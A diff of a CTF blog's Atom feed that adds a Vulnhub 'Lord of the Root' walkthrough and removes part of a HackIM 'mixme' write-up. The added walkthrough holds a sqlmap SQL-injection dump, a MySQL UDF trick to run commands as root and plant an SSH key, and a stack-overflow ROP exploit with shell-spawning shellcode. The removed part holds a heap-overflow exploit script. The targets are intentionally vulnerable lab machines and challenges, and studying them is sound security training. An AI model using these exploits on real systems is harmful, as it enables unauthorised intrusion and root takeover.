@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Binary | staring into /dev/null]]></title>
   <link href="http://barrebas.github.io/blog/categories/binary/atom.xml" rel="self"/>
   <link href="http://barrebas.github.io/"/>
-  <updated>2015-09-22T23:07:26+02:00</updated>
+  <updated>2015-10-04T11:23:41+02:00</updated>
   <id>http://barrebas.github.io/</id>
   <author>
     <name><![CDATA[barrebas]]></name>
@@ -12,6 +12,375 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Lord of the Root]]></title>
+    <link href="http://barrebas.github.io/blog/2015/10/04/lord-of-the-root/"/>
+    <updated>2015-10-04T10:02:33+02:00</updated>
+    <id>http://barrebas.github.io/blog/2015/10/04/lord-of-the-root</id>
+    <content type="html"><![CDATA[<p>I figured I&rsquo;d try another VM from Vulnhub for a change. This is Lord of the Root v1.0.1.</p>
+
+<!--more-->
+
+
+<p><em>Note</em>: Before I could even start the VM with Virtualbox, I had to unpack the .ova, delete the .mf file and remove xml entries from the .ovf file.</p>
+
+<p>The first portscan yielded only ssh as an open port. Upon connecting we get this banner:</p>
+
+<pre><code class="bash">$ ssh root@192.168.56.101
+
+                                                  .____    _____________________________
+                                                  |    |   \_____  \__    ___/\______   \
+                                                  |    |    /   |   \|    |    |       _/
+                                                  |    |___/    |    \    |    |    |   \
+                                                  |_______ \_______  /____|    |____|_  /
+                                                          \/       \/                 \/
+ ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
+|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
+|      &lt;  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
+|    |  \|   |  (  &lt;_&gt; )  \___|    &lt;   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  &lt;_&gt; )  |        \   |  \  | \  ___/|  | \/
+|____|__ \___|  /\____/ \___  &gt;__|_ \  \___  /   |__|  |__|\___  &gt;___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  &gt;__|
+        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
+Easy as 1,2,3
+root@192.168.56.101's password:
+</code></pre>
+
+<p>&ldquo;Knock Friend to Enter&rdquo; and &ldquo;Easy as 1,2,3&rdquo; so that has to be port-knocking. I tried to &ldquo;knock&rdquo; with <code>nc</code>, but that didn&rsquo;t work. I hoped the sequence was indeed 1,2,3 so I just used nmap to do it:</p>
+
+<pre><code class="bash">$ nmap -n -T4 -sV -Pn -r 192.168.56.101 -p1,2,3
+
+Starting Nmap 6.00 ( http://nmap.org ) at 2015-10-04 10:15 CEST
+Nmap scan report for 192.168.56.101
+Host is up.
+PORT  STATE    SERVICE     VERSION
+1/tcp filtered tcpmux
+2/tcp filtered compressnet
+3/tcp filtered compressnet
+</code></pre>
+
+<p>And after this, port 1337 was open:</p>
+
+<pre><code class="bash">1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+</code></pre>
+
+<p>It&rsquo;s a webserver that serves a single page. I tried to view robots.txt but was given another picture (two hipster hobbits or something). However, the page source contained <code>&lt;!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh&gt;</code>. Let&rsquo;s decode that base64:</p>
+
+<pre><code class="bash">$ echo 'THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh' |base64 -d
+Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!
+$ echo 'Lzk3ODM0NTIxMC9pbmRleC5waHA=' |base64 -d
+/978345210/index.php
+</code></pre>
+
+<p>OK so I browsed to that location. It&rsquo;s a login page that is vulnerable to SQLi. I had a hard time finding and exploiting it, because I made a silly mistake. I dumped the database I needed, finally, with this command:</p>
+
+<pre><code class="bash">$ python ./sqlmap.py -u "http://192.168.56.101:1337/978345210/index.php" --data="username=bleh&amp;password=d&amp;submit= Login " --risk 3 --level 3 --dump -D Webapp -t password --dbms=mysql
+</code></pre>
+
+<p>In first instance, however, I only used <code>--data "username=bleh&amp;password=d</code>, which prevented SQLmap from finding the SQLi. Note to future self: <em>always</em> include <em>all</em> form parameters!</p>
+
+<p>Anyway, dumping all the data from the db took too long because it was blind SQLi so I just dumped <code>Webapp</code> once I found the database names. Long live SQLmap! This database contained usernames based on Lord of the Rings. I tried logging in to the webpage but couldn&rsquo;t find anything interesting. I tried the five usernames against ssh and struck gold with <code>smeagol:MyPreciousR00t</code>.</p>
+
+<p>From here, there were two ways to root the box: one via a suid binary, one via <code>mysql</code>. I&rsquo;ll start with the SQL route.</p>
+
+<h2>Root via mysql</h2>
+
+<p><code>mysql</code> is running as root:</p>
+
+<pre><code class="bash">smeagol@LordOfTheRoot:~$ ps aux |grep sql
+root      1085  2.0  4.2 318220 43072 ?        Ssl  04:07   0:26 /usr/sbin/mysqld
+</code></pre>
+
+<p>That&rsquo;s really nice. I grabbed the login from the web source:</p>
+
+<pre><code class="bash">smeagol@LordOfTheRoot:~$ cat /var/www/978345210/login.php 
+&lt;?php
+session_start(); // Starting Session
+$error=''; // Variable To Store Error Message
+if (isset($_POST['submit'])) {
+    if (empty($_POST['username']) || empty($_POST['password'])) {
+        $error = "Username or Password is invalid";
+    }
+    else
+    {
+        // Define $username and $password
+        $username=$_POST['username'];
+        $password=$_POST['password'];
+        $db = new mysqli('localhost', 'root', 'darkshadow', 'Webapp');
+
+        // To protect MySQL injection for Security purpose
+        $username = stripslashes($username);
+        $password = stripslashes($password);
+
+        $sql="select username, password from Users where username='".$username."' AND password='".$password."';";
+        //echo $sql;
+                $query = $db-&gt;query($sql);
+                $rows = $query-&gt;num_rows;
+
+        if ($rows == 1) {
+            $_SESSION['login_user']=$username; // Initializing Session
+            header("location: profile.php"); // Redirecting To Other Page
+        } else {
+            $error = "Username or Password is invalid";
+        }
+    }
+}
+?&gt;
+</code></pre>
+
+<p>We can now login to <code>mysql</code> as root and upload <code>lib_mysqludf_sys</code> to enable command execution. I ripped parts from my <a href="https://barrebas.github.io/blog/2014/11/03/we-need-to-go-deeper-kvasir-writeup/">Kvasir</a> writeup. I cloned the <a href="https://github.com/mysqludf/lib_mysqludf_sys">lib_mysqludf_sys</a> repo and ran the following commands:</p>
+
+<pre><code class="bash">echo "SELECT 0x" &gt; payload
+cat lib_mysqludf_sys.so |xxd -p &gt;&gt; payload
+echo " INTO DUMPFILE '/usr/lib/mysql/plugin/udf_exploit.so'; " &gt;&gt; payload
+</code></pre>
+
+<p><code>payload</code> was ran through <code>tr -d '\n'</code> to remove newlines and the output of that command was entered into the mysql prompt. This creates the <code>udf_exploit.so</code> file on the remote box. From there, I ran:</p>
+
+<pre><code class="bash">mysql&gt; CREATE FUNCTION sys_exec RETURNS int SONAME 'udf_exploit.so'; 
+Query OK, 0 rows affected (0.00 sec)
+</code></pre>
+
+<p>I created ssh keys for this joyous occasion and upload the public key to the root directory:</p>
+
+<pre><code class="bash">mysql&gt; SELECT "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhzEQ1uE0pjtDVHQZg17PP1rihY0ju7u0fBSJax/oAfxWXia9e229BpW+P6U08zEE4FhnhKdy4Tqyz8sdqwiPFldi8MkzA68oWBP5QwwGBF+CGrsQ7b8CLDSESPOKMx8uTz71OJObHRzC6Vtuhe9CD3unoTw5i1XNRq/Hl3Zm/BaYQB9yQMA6FoE7qt8UhZS1uis9EsNGvUSvYdrRUM7XiWEsml6Q9EGFs0jVZn/UGCr4rD/t0yqNtAKtH+9j2GRbh2pKTynfFXuHTzzODtiHzbEfmO/ma4B2gcyEzj+FBHxhwZAWQ349Fy/m1oDUJsbnk+tlLbdbPoDOTeS1nOAzD" INTO OUTFILE '/root/.ssh/autorized_keys';
+Query OK, 1 row affected (0.00 sec)
+
+mysql&gt; SELECT sys_exec("chmod 600 /root/.ssh/authorized_keys");
++--------------------------------------------------+
+| sys_exec("chmod 600 /root/.ssh/authorized_keys") |
++--------------------------------------------------+
+|                                                0 |
++--------------------------------------------------+
+1 row in set (0.02 sec)
+</code></pre>
+
+<p>Now I could ssh in as root:</p>
+
+<pre><code class="bash">$ ssh root@192.168.56.101 -i ./rootkey
+
+                                                  .____    _____________________________
+                                                  |    |   \_____  \__    ___/\______   \
+                                                  |    |    /   |   \|    |    |       _/
+                                                  |    |___/    |    \    |    |    |   \
+                                                  |_______ \_______  /____|    |____|_  /
+                                                          \/       \/                 \/
+ ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
+|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
+|      &lt;  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
+|    |  \|   |  (  &lt;_&gt; )  \___|    &lt;   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  &lt;_&gt; )  |        \   |  \  | \  ___/|  | \/
+|____|__ \___|  /\____/ \___  &gt;__|_ \  \___  /   |__|  |__|\___  &gt;___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  &gt;__|
+        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
+Easy as 1,2,3
+Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 3.19.0-25-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+                            .____    _____________________________                              
+                            |    |   \_____  \__    ___/\______   \                             
+                            |    |    /   |   \|    |    |       _/                             
+                            |    |___/    |    \    |    |    |   \                             
+                            |_______ \_______  /____|    |____|_  /                             
+                                    \/       \/                 \/                              
+ __      __       .__                                ___________      .__                   .___
+/  \    /  \ ____ |  |   ____  ____   _____   ____   \_   _____/______|__| ____   ____    __| _/
+\   \/\/   // __ \|  | _/ ___\/  _ \ /     \_/ __ \   |    __) \_  __ \  |/ __ \ /    \  / __ | 
+ \        /\  ___/|  |_\  \__(  &lt;_&gt; )  Y Y  \  ___/   |     \   |  | \/  \  ___/|   |  \/ /_/ | 
+  \__/\  /  \___  &gt;____/\___  &gt;____/|__|_|  /\___  &gt;  \___  /   |__|  |__|\___  &gt;___|  /\____ | 
+       \/       \/          \/            \/     \/       \/                  \/     \/      \/ 
+Last login: Sun Oct  4 04:38:51 2015 from 192.168.56.1
+root@LordOfTheRoot:~# 
+</code></pre>
+
+<p>So that&rsquo;s the <code>mysql</code> route. Now on to the binary!</p>
+
+<h2>Vulnerable binary</h2>
+
+<pre><code class="bash">smeagol@LordOfTheRoot:~$ find / -perm -4000 -type f 2&gt;/dev/null
+/bin/fusermount
+/bin/su
+/bin/mount
+/bin/ping
+/bin/umount
+/bin/ping6
+/SECRET/door2/file
+/SECRET/door1/file
+/SECRET/door3/file
+</code></pre>
+
+<p>Ah, interesting. This reminds me of knock-knock.</p>
+
+<pre><code class="bash">smeagol@LordOfTheRoot:~$ md5sum /SECRET/door*/file
+f0c663095117d908e16412570d2c6252  /SECRET/door1/file
+f0c663095117d908e16412570d2c6252  /SECRET/door2/file
+bb0e0e4439b5039e71405f8a1b6d5c0c  /SECRET/door3/file
+</code></pre>
+
+<p>I grabbed <code>door3</code> and started analysing it on my local box. It contains a <code>strcpy</code> that allows us to control EIP.</p>
+
+<pre><code class="bash">smeagol@LordOfTheRoot:~$ objdump -d -M intel --no-show-raw-insn /SECRET/door3/file |less
+
+0804845d &lt;main&gt;:
+ 804845d:       push   ebp
+ 804845e:       mov    ebp,esp
+ 8048460:       and    esp,0xfffffff0
+ 8048463:       sub    esp,0xb0
+ 8048469:       cmp    DWORD PTR [ebp+0x8],0x1
+ 804846d:       jg     8048490 &lt;main+0x33&gt;
+ 804846f:       mov    eax,DWORD PTR [ebp+0xc]
+ 8048472:       mov    eax,DWORD PTR [eax]
+ 8048474:       mov    DWORD PTR [esp+0x4],eax
+ 8048478:       mov    DWORD PTR [esp],0x8048540
+ 804847f:       call   8048310 &lt;printf@plt&gt;
+ 8048484:       mov    DWORD PTR [esp],0x0
+ 804848b:       call   8048340 &lt;exit@plt&gt;
+ 8048490:       mov    eax,DWORD PTR [ebp+0xc]
+ 8048493:       add    eax,0x4
+ 8048496:       mov    eax,DWORD PTR [eax]
+ 8048498:       mov    DWORD PTR [esp+0x4],eax
+ 804849c:       lea    eax,[esp+0x11]
+ 80484a0:       mov    DWORD PTR [esp],eax
+ 80484a3:       call   8048320 &lt;strcpy@plt&gt;
+ 80484a8:       mov    eax,0x0
+ 80484ad:       leave  
+ 80484ae:       ret    
+ 80484af:       nop
+</code></pre>
+
+<p>I quickly found that I had to run the binary with the first argument containing 171 chars + EIP to overwrite the saved return address on the stack. Let&rsquo;s see how we can spawn a shell&hellip;</p>
+
+<pre><code class="bash">$ gdb -q ./door3
+Reading symbols from /home/bas/downloads/LotR/door3...(no debugging symbols found)...done.
+gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : disabled
+PIE       : disabled
+RELRO     : disabled
+</code></pre>
+
+<p>Okay, so no protections whatsoever. We could place shellcode on the stack and pwn like it&rsquo;s 1999.</p>
+
+<pre><code class="bash">gdb-peda$ r $(python -c 'print "A"*171+"BBBBCCCC"')
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0xf7fbeff4 --&gt; 0x15fd7c 
+ECX: 0x0 
+EDX: 0xb4 
+ESI: 0x0 
+EDI: 0x0 
+EBP: 0x41414141 ('AAAA')
+ESP: 0xffffd530 ("CCCC")
+EIP: 0x42424242 ('BBBB')
+EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x42424242
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd530 ("CCCC")
+0004| 0xffffd534 --&gt; 0xffffd500 ('A' &lt;repeats 44 times&gt;, "BBBBCCCC")
+0008| 0xffffd538 --&gt; 0xffffd5e0 --&gt; 0xffffd7e5 ("ORBIT_SOCKETDIR=/tmp/orbit-bas")
+0012| 0xffffd53c --&gt; 0xf7fde860 --&gt; 0xf7e5f000 --&gt; 0x464c457f 
+0016| 0xffffd540 --&gt; 0xf7ff4821 (mov    eax,DWORD PTR [ebp-0x10])
+0020| 0xffffd544 --&gt; 0xffffffff 
+0024| 0xffffd548 --&gt; 0xf7ffcff4 --&gt; 0x1cf2c 
+0028| 0xffffd54c --&gt; 0x8048249 ("__libc_start_main")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x42424242 in ?? ()
+gdb-peda$ 
+</code></pre>
+
+<p>Let&rsquo;s just jump to the stack! However, there is no <code>jmp esp</code> opcode in the binary, so it looks like we have a problem. ASLR <em>is</em> enabled on the remote box and none of the registers point directly to the &ldquo;shellcode&rdquo; on the stack. We can hardcode the stack address but that will lead to lots of failed attempts. Let&rsquo;s be smart about this.</p>
+
+<p>Verify no <code>jmp esp</code>:</p>
+
+<pre><code class="bash">gdb-peda$ asmsearch "jmp esp"
+Searching for ASM code: 'jmp esp' in: binary ranges
+0x08048365 : (83e4) and    esp,0xfffffff0
+0x08048460 : (83e4) and    esp,0xfffffff0
+0x08048c1b : (00e4) add    ah,ah
+0x08049365 : (83e4) and    esp,0xfffffff0
+0x08049460 : (83e4) and    esp,0xfffffff0
+gdb-peda$ asmsearch "call esp"
+Searching for ASM code: 'call esp' in: binary ranges
+0x0804864f : (00d4) add    ah,dl
+0x08048a6f : (00d4) add    ah,dl
+0x08048a73 : (08d4) or     ah,dl
+0x08048e0f : (00d4) add    ah,dl
+0x0804964f : (00d4) add    ah,dl
+gdb-peda$ find "\xff\xd4" binary
+Searching for '\xff\xd4' in: binary ranges
+Not found
+gdb-peda$ find "\xff\xe4" binary
+Searching for '\xff\xe4' in: binary ranges
+Not found
+</code></pre>
+
+<p>However, we do have <code>strcpy</code> and this memory region:</p>
+
+<pre><code class="bash">gdb-peda$ vmmap
+Start      End        Perm  Name
+0x08048000 0x08049000 r-xp  /home/bas/downloads/LotR/door3
+0x08049000 0x0804a000 rwxp  /home/bas/downloads/LotR/door3
+</code></pre>
+
+<p><code>0x08049000</code> is <code>rwx</code>! We can now use <code>strcpy</code> to write <code>ff e4</code> to memory and return to it, which bypasses ASLR because the binary is always loaded on the same address. Let&rsquo;s ROP this! <code>strcpy@plt</code> is at 0x8048320 but we can&rsquo;t use that address because it contains a space. We&rsquo;ll just use strcpy+6, which jumps to the resolver to resolve strcpy.</p>
+
+<pre><code class="bash">gdb-peda$ x/4i 0x8048320
+   0x8048320 &lt;strcpy@plt&gt;:  jmp    DWORD PTR ds:0x8049740
+   0x8048326 &lt;strcpy@plt+6&gt;:    push   0x8
+   0x804832b &lt;strcpy@plt+11&gt;:   jmp    0x8048300
+   0x8048330 &lt;__gmon_start__@plt&gt;:  jmp    DWORD PTR ds:0x8049744
+</code></pre>
+
+<p>With that out of the way, we need a pop2ret to balance the stack. This is easily located with gdb-peda&rsquo;s <code>ropgadget</code> command and I chose 0x804850e. Last thing I needed was the address of the bytes <code>0xff</code> and <code>0xe4</code> and again gdb-peda provided those. Putting the ROP chain together:</p>
+
+<pre><code class="python">import struct
+def p(x):
+    return struct.pack('&lt;L', x)
+
+def write(what, where):
+    # strcpy(dest, src)
+    # use strcpy+6 otherwise the address will contain a space, messes up argv
+    # second address is pop2ret
+    return p(0x8048326)+p(0x804850e)+p(where)+p(what)
+
+z = ""
+z += "A"*171
+z += write(0x804852c, 0x8049330) # ff
+z += write(0x8048366, 0x8049331) # e4 jmp esp
+z += p(0x8049330)
+# modified /bin/ash shellcode: http://shell-storm.org/shellcode/files/shellcode-547.php
+z += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68"
+z += "\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24"
+z += "\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd"
+z += "\x80\x31\xc0\xb0\x01\xcd\x80"
+</code></pre>
+
+<p>Death to nopsleds!</p>
+
+<pre><code class="bash">smeagol@LordOfTheRoot:~$ md5sum /SECRET/door*/file
+f0c663095117d908e16412570d2c6252  /SECRET/door1/file
+bb0e0e4439b5039e71405f8a1b6d5c0c  /SECRET/door2/file
+f0c663095117d908e16412570d2c6252  /SECRET/door3/file
+smeagol@LordOfTheRoot:~$ /SECRET/door2/file $(python poc.py)
+# whoami
+root
+# id
+uid=1000(smeagol) gid=1000(smeagol) euid=0(root) groups=0(root),1000(smeagol)
+# 
+</code></pre>
+
+<p>And there you go. A reliable way to spawn a root shell from that vulnerable binary. Game over.</p>
+
+<pre><code class="bash"># cat /root/Flag*
+"There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power."
+– Gandalf
+</code></pre>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[CSAW 2015 - Pwn250]]></title>
@@ -1549,470 +1918,6 @@ flag{y0u_br0k3_1n70_5h3rl0ck_m1ndp4l4c3}
 </code></pre>
 
 <p>The flag was <code>flag{y0u_br0k3_1n70_5h3rl0ck_m1ndp4l4c3}</code>.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[HackIM CTF - Mixme]]></title>
-    <link href="http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mixme-writeup/"/>
-    <updated>2015-01-11T18:52:35+01:00</updated>
-    <id>http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mixme-writeup</id>
-    <content type="html"><![CDATA[<p><code>mixme</code> was a 400 points exploitation challenge of the NullCon HackIM ctf. We solved it with just 20 minutes on the clock!</p>
-
-<!-- more -->
-
-
-<p>When started, <code>mixme</code> present the following:</p>
-
-<pre><code>==========================================
-======== Uncle Podger's Data Store =======
-==========================================
-
-Select op (store/get/edit/exit): store
-Name: a
-Size: 4
-Enter data: AAAA
-Select op (store/get/edit/exit): get
-Name: a
-Size: 4
-AAAASelect op (store/get/edit/exit): get
-Name: a
-Size: 4
-Not found
-Select op (store/get/edit/exit): Invalid input
-Select op (store/get/edit/exit): 
-</code></pre>
-
-<p>Again, some kind of note storage. The binary was first reverse-engineered by superkojiman, who immediately noticed something odd: upon <code>get</code>ing a note, the program erases the note by <code>free()</code>ing the memory and NULLing the first few bytes. The rest of the bytes were left intact. This led us to think about possible use-after-free scenarios. Turns out it was something different&hellip;</p>
-
-<p>I started tinkering with the binary. I could store notes and get them back, but only if I supplied the right size. However, I noticed that I could <em>edit</em> a note with a larger value than was allocated. The heap looks like this after allocating three notes <code>a</code>, <code>b</code> and <code>c</code> with length 4 and contents <code>AAAA</code>, <code>BBBB</code>, and <code>CCCC</code>, respectively:</p>
-
-<pre><code># allocated three notes, in heap:
-0x8314000:  0x00000000  0x00000029  0x44414548  0x00000000
-0x8314010:  0x00000000  0x00000000  0x00000000  0x00000000
-0x8314020:  0x08314030  0x083140a0  0x00000000  0x00000029
-0x8314030:  0x00000061  0x00000000  0x00000000  0x00000000
-0x8314040:  0x00000004  0x08314058  0x08314068  0x08314008
-0x8314050:  0x00000000  0x00000011  0x41414141  0x00000000
-0x8314060:  0x00000000  0x00000029  0x00000062  0x00000000
-0x8314070:  0x00000000  0x00000000  0x00000004  0x08314090
-0x8314080:  0x083140a0  0x08314030  0x00000000  0x00000011
-0x8314090:  0x42424242  0x00000000  0x00000000  0x00000029
-0x83140a0:  0x00000063  0x00000000  0x00000000  0x00000000
-0x83140b0:  0x00000004  0x083140c8  0x08314008  0x08314068
-0x83140c0:  0x00000000  0x00000011  0x43434343  0x00000000
-0x83140d0:  0x00000000  0x00020f31  0x00000000  0x00000000
-0x83140e0:  0x00000000  0x00000000  0x00000000  0x00000000
-</code></pre>
-
-<p>At <code>0x8314030</code>, we see the first note&rsquo;s name, <code>a</code>. The zeroeth note is called <code>HEAD</code> and precedes our first note. Each note is contained within a struct, which contains pointers to the previous and next note (a doubly linked list). The meta-data for note <code>a</code> contains this pointer: <code>0x08314058</code>, which points to the data associated with that note: <code>AAAA</code>. The meta-data for the note looks something like this:</p>
-
-<pre><code class="c">note_info struct {
-    char name[16];
-    int length;
-    char *content;
-    note_info *next_note;
-    note_info *prev_note;
-};
-</code></pre>
-
-<p>This also is true for the next note, <code>b</code>, which is immediately after <code>a</code> in memory. We can overwrite the meta-data of note <code>b</code> by editing note <code>a</code>.</p>
-
-<h2>Overflowing the heap</h2>
-
-<p>If we supply 40 bytes when editing <code>a</code> and supplying forty times <code>0x41</code>, we overwrite several parts of the meta-data of note <code>b</code>:</p>
-
-<pre><code># after editing 'a' with 40 bytes where 4 is allocated:
-0x8314000:  0x00000000  0x00000029  0x44414548  0x00000000
-0x8314010:  0x00000000  0x00000000  0x00000000  0x00000000
-0x8314020:  0x083140a0  0x083140a0  0x00000000  0x00000029
-0x8314030:  0x00000061  0x00000000  0x00000000  0x00000000
-0x8314040:  0x00000004  0x08314058  0x08314068  0x08314008
-0x8314050:  0x00000000  0x00000011  0x41414141  0x41414141
-0x8314060:  0x41414141  0x41414141  0x41414141  0x41414141
-0x8314070:  0x41414141  0x41414141  0x41414141  0x41414141
-0x8314080:  0x083140a0  0x08314008  0x00000000  0x00000011
-0x8314090:  0x42424242  0x42424242  0x42424242  0x42424242
-0x83140a0:  0x42424242  0x42424242  0x42424242  0x42424242
-0x83140b0:  0x42424242  0x083140c8  0x08314008  0x08314008
-0x83140c0:  0x00000000  0x00000011  0x43434343  0x00000000
-0x83140d0:  0x00000000  0x00020f31  0x00000000  0x00000000
-0x83140e0:  0x00000000  0x00000000  0x00000000  0x00000000
-</code></pre>
-
-<p>If we now try to <code>get</code> note <code>b</code>, the binary will segfault because the pointer to the note&rsquo;s data is set to <code>0x41414141</code>. We can use this to make note <code>b</code> point to <code>free@got</code> with a bit of python. The binary is started using socat to make it listen on a port.</p>
-
-<pre><code># set 'a' with large buffer, overwriting meta-data of 'b':
-0x8314000:  0x00000000  0x00000029  0x44414548  0x00000000
-0x8314010:  0x00000000  0x00000000  0x00000000  0x00000000
-0x8314020:  0x083140a0  0x083140a0  0x00000000  0x00000029
-0x8314030:  0x00000061  0x00000000  0x00000000  0x00000000
-0x8314040:  0x00000004  0x08314058  0x08314068  0x08314008
-0x8314050:  0x00000000  0x00000011  0x41414141  0x41414141
-0x8314060:  0x41414141  0x00000029  0x00000062  0x41414141
-0x8314070:  0x41414141  0x41414141  0x00000024  0x08314090
-0x8314080:  0x083140a0  0x08314008  0x00000000  0x00000011
-0x8314090:  0x42424242  0x42424242  0x42424242  0x42424242
-0x83140a0:  0x42424242  0x42424242  0x42424242  0x42424242
-0x83140b0:  0x42424242  0x083140c8  0x08314008  0x08314008
-0x83140c0:  0x00000000  0x00000011  0x43434343  0x00000000
-0x83140d0:  0x00000000  0x00020f31  0x00000000  0x00000000
-0x83140e0:  0x00000000  0x00000000  0x00000000  0x00000000
-</code></pre>
-
-<p>Notice that I&rsquo;ve kept the bytes at <code>0x8314064</code> and <code>0x8314068</code> the same: <code>0x00000029 0x00000062</code>. If these are overwritten, then the binary cannot find note <code>b</code> anymore, which effectively stops our attack! I overwrote the pointer to the data with <code>0x804b020</code>. This is the pointer to <code>free()</code> in the Global Offset Table. Remember, after every <code>get</code> sent to the binary, <code>free()</code> is called. By overwriting the pointer to the note data, we can set any memory to arbitrary values with an <code>edit b</code> command to the binary!</p>
-
-<h2>Control of execution</h2>
-
-<p>I tested this hypothesis with the following python:</p>
-
-<pre><code class="python">import re
-import string
-import struct
-import socket
-import time
-import telnetlib
-import sys
-
-def p(x):
-    return struct.pack('&lt;L', x)
-
-# function to send commands to the binary
-def z(sock, x):
-    sock.send(x + '\n')
-    time.sleep(0.01)
-    data = sock.recv(200)
-    time.sleep(0.01)
-    return data
-
-# connect to remote host
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('localhost', 9005))
-
-# receive banner
-s.recv(512)
-
-# ask the binary to store three notes
-# we'll overflow a into b later on
-z(s, "store")
-z(s, "a")
-z(s, "4")
-z(s, "AAAA")
-
-z(s, "store")
-z(s, "b")
-z(s, "4")
-z(s, "BBBB")
-
-z(s, "store")
-z(s, "c")
-z(s, "4")
-z(s, "CCCC")
-
-# edit a with a large value
-# this overflows and overwrites the note_info struct of b
-# the pointer to the data is overwriting with free@got
-print "[+] overflowing a to set b to free@got"
-z(s, 'edit')
-z(s, 'a')
-z(s, '40')
-z(s, "A"*12+"\x29\x00\x00\x00\x62\x00\x00\x00"+"A"*12+p(4)+p(0x804b020))
-#     ^ overflow    ^ restore 0x29, 'b'               ^ size of b ^ free@got
-
-# overwrite free@got with printf
-print "[+] replacing free() with printf()"
-z(s, 'edit')
-z(s, 'b')
-z(s, '4')
-z(s, 'BBBB')
-
-z(s, 'get')
-z(s, 'c')
-z(s, '4')
-</code></pre>
-
-<p>This made the binary crash. The coredump reported the following:</p>
-
-<pre><code class="python">#0  0x42424242 in ?? ()
-gdb-peda$ i r
-eax            0x843b0c8    0x843b0c8
-ecx            0x843b0c8    0x843b0c8
-edx            0x4  0x4
-ebx            0xb779cff4   0xb779cff4
-esp            0xbf95245c   0xbf95245c
-ebp            0xbf952498   0xbf952498
-esi            0x0  0x0
-edi            0x0  0x0
-eip            0x42424242   0x42424242
-eflags         0x10207  [ CF PF IF RF ]
-cs             0x73 0x73
-ss             0x7b 0x7b
-ds             0x7b 0x7b
-es             0x7b 0x7b
-fs             0x0  0x0
-gs             0x33 0x33
-gdb-peda$ p system
-$1 = {&lt;text variable, no debug info&gt;} 0xb7636060 &lt;system&gt;
-gdb-peda$ x/4x $esp
-0xbf95245c: 0x08048bb8  0x0843b0c8  0x0843b0c8  0x00000004
-
-gdb-peda$ x/4x $eax
-0x843b0c8:  0x43434343  0x00000000
-</code></pre>
-
-<p>Bloody awesome! We not only have control over EIP, but also eax, ecx and the first argument on the stack point to memory that we control. This will come in handy later.</p>
-
-<h2>Turning the heap overflow into a format string vulnerability</h2>
-
-<p>With what should I overwrote the got pointer to <code>free()</code> though? I looked for ROP gadgets, but there weren&rsquo;t enough to pivot the stack into the heap and spawn a shell, or open/read/write the flag to stdout. Furthermore, I assumed ASLR was enabled so I had to leak libc addresses first.</p>
-
-<p>After thinking about it, I chose to overwrite <code>free@got</code> with <code>printf@plt</code>. This turns the heap overflow into a format string vulnerability! Maybe this is where the challenge name comes from&hellip;</p>
-
-<p>After setting <code>free@got</code> to <code>printf@plt</code>, whenever I ask the binary to <code>get</code> a note, I can print whatever content is associated with that note (because <code>free()</code> is called with the pointer to the content of the note).</p>
-
-<p>I examined the stack by supplying a format string consisting of a bunch of <code>%x</code>&rsquo;s. Obviously, I couldn&rsquo;t dig up my own format string from the stack, because the format string itself is on the heap!</p>
-
-<h2>What&rsquo;s that gem?</h2>
-
-<p>Examining the stack, I dumped the following data:</p>
-
-<pre><code># local binary
-85850c8-122-b75c77b0-122-85850a0-85850a0-63... &lt;snip&gt;
-</code></pre>
-
-<p>That third address looks promising! It points into <code>libc</code>. Unfortunately, there&rsquo;s a problem. Running the script against the server gave a different address:</p>
-
-<pre><code># remote binary
-83370c8-122-b75c0024-122-83370a0-83370a0-b7000063-... &lt;snip&gt;
-936e0c8-122-b764a024-122-936e0a0-936e0a0-b7000063-... &lt;snip&gt;
-</code></pre>
-
